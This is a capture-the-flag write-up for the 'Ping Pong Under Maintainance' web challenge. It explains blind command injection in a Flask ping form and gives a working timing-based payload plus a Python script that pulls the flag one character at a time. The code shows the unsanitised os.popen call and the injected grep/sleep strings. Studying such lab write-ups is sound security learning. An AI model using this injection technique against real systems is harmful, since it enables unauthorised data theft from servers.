## Write Up For Ping Pong Under Maintainance

First check what the difference between
Ping Pong and Ping Pong Under Maintainance

### Ping Pong
```py
return render_template('index.html', output=output)
```

### Ping Pong Under Maintainance
```py
return render_template('index.html', output='The service is currently under maintainence and we have disabled outbound connections as a result.')
```

Notice that the only difference between the two is that Ping Pong Under
Maintainance won't output what the command does

However, the program will still excute the command as seen in these lines

```py
hostname = request.form['hostname']
cmd = "ping -c 3 " + hostname
output = os.popen(cmd).read()
```

This means command injection is still viable
but there must be some other way to get flag information

After a lot of thinking, testing, and failing
I finally found a timing attack

If it is possible to check whether some substring exists in the flag file
then use that change the website reponse time depending on true or false then it would be possible to brute force each character till the flag is found

### The Payload

```bash
grep LITCTF{text flag.txt || sleep $?
```

Using this command can check if some prefix starting with LITCTF{ is in the flag file

$? returns 1 if the text grepped is in the file and 0 if it is not

Testing this command out, a proper prefix such as LITCTF causes the website to respond almost instantly;
however, a string such at ASHJFJSHD would cause the website to take over a second to load

Now that a working explot is found, 
the prefix of the flag can be tested one character at a time


And here is a simple python program to find the flag one char at a time

### Python Script

```py
import requests
import string

#allowed characters in flag
charlist = string.ascii_lowercase+string.digits+"_}"

#known prefix
flag = "LITCTF{"


#changes with every instance
url = 'http://34.130.180.82:59880/'

#headers for POST request
headers = {
    'Host': url,
}


#payload
data = {
    'hostname': 'temp',
}

#loops till we get the flag
while True:
    #correct next character
    bestchr = " "

    #testing each character
    for x in charlist:
        #test prefix
        teststr = flag+x
        #payload
        injection = f";grep -q {teststr} flag.txt || sleep $(($?*1))"
        data = {'hostname': injection}
        #sending request
        req = requests.post(url, headers=headers, data=data)
        #check how long it took
        if req.elapsed.total_seconds() < 1:
            #found the correct char
            bestchr = x
            break
    
    #appending char to flag
    flag+=bestchr
    #prints flag everytime we find the next char
    print(flag)
    #exits ones flag is found
    if(bestchr == '}'): break

```

After a while of using this program
I was able to retrieve the flag

### LITCTF{c4refu1_fr}


# YOUR DID IT :D
